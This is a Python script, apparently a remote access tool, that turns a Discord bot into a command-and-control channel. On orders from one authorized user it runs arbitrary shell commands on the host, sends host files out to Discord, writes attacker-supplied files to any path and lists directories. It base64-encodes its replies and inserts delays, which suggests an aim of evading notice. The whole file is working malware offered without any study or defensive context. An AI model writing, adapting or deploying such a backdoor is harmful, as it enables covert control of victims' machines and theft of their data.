import os
import subprocess
import discord
from discord.ext import commands
import asyncio
import base64

DISCORD_TOKEN = ""
CHANNEL_ID = 
AUTHORIZED_USER_ID = 

BOT_PREFIX = "$"
DELAY_SECONDS = 10

def run_shell(cmd):
    try:
        result = subprocess.run(
            cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
            text=True
        )
        output = result.stdout + result.stderr
    except Exception as e:
        output = str(e)
    return output

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Connected as {bot.user}')
    bot.channel = bot.get_channel(CHANNEL_ID)
    if not bot.channel:
        print("Channel not found!")

    await asyncio.sleep(DELAY_SECONDS)

@bot.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID:
        return
    if message.author.id != AUTHORIZED_USER_ID:
        return
    if message.author == bot.user:
        return
    if not message.content.startswith(BOT_PREFIX):
        return

    raw_command = message.content[len(BOT_PREFIX):].strip()

    await asyncio.sleep(DELAY_SECONDS)
    encoded_command = base64.b64encode(raw_command.encode()).decode()

    decoded_command = base64.b64decode(encoded_command).decode()

    if decoded_command.lower() in ['exit', 'quit']:
        encoded_output = base64.b64encode("Shutting down...\n".encode()).decode()
        await message.reply(f"```\n{encoded_output}\n```")
        await bot.close()
        return

    elif decoded_command.startswith("download"):
        try:
            _, filepath = decoded_command.split(" ", 1)
            if not os.path.isfile(filepath):
                encoded_error = base64.b64encode(f"Error: File does not exist: {filepath}\n".encode()).decode()
                await message.reply(f"```\n{encoded_error}\n```")
                return

            await message.reply(file=discord.File(filepath))
        except Exception as e:
            encoded_error = base64.b64encode(f"Error: {str(e)}\n".encode()).decode()
            await message.reply(f"```\n{encoded_error}\n```")

    elif decoded_command.startswith("upload"):
        try:
            _, dest_path = decoded_command.split(" ", 1)

            def check(m):
                return m.author.id == AUTHORIZED_USER_ID and m.channel == message.channel and m.attachments

            status_msg = base64.b64encode(f"Waiting for file upload to: {dest_path}...\n".encode()).decode()
            await message.reply(f"```\n{status_msg}\n```")

            reply = await bot.wait_for('message', timeout=60.0, check=check)
            attachment = reply.attachments[0]

            data = await attachment.read()
            with open(dest_path, "wb") as f:
                f.write(data)

            success = base64.b64encode(f"Saved file to: {dest_path}\n".encode()).decode()
            await message.reply(f"```\n{success}\n```")

        except asyncio.TimeoutError:
            encoded_error = base64.b64encode("Upload timed out.\n".encode()).decode()
            await message.reply(f"```\n{encoded_error}\n```")
        except Exception as e:
            encoded_error = base64.b64encode(f"Error: {str(e)}\n".encode()).decode()
            await message.reply(f"```\n{encoded_error}\n```")

    elif decoded_command.startswith("list"):
        try:
            _, path = decoded_command.split(" ", 1)
            if not os.path.isdir(path):
                output = f"[!] Path does not exist or is not a directory: {path}"
            else:
                files = os.listdir(path)
                output = f"Listing files in {path}:\n" + "\n".join(files)
        except Exception as e:
            output = f"[!] Error listing directory: {str(e)}"
        encoded_output = base64.b64encode(output.encode()).decode()
        await message.reply(f"```\n{encoded_output}\n```")

    else:
        output = run_shell(decoded_command)
        encoded_output = base64.b64encode(output.encode()).decode()
        await message.reply(f"```\n{encoded_output}\n```")
    await asyncio.sleep(DELAY_SECONDS)
    
try:
    bot.run(DISCORD_TOKEN)
except KeyboardInterrupt:
    print("Shutting down...")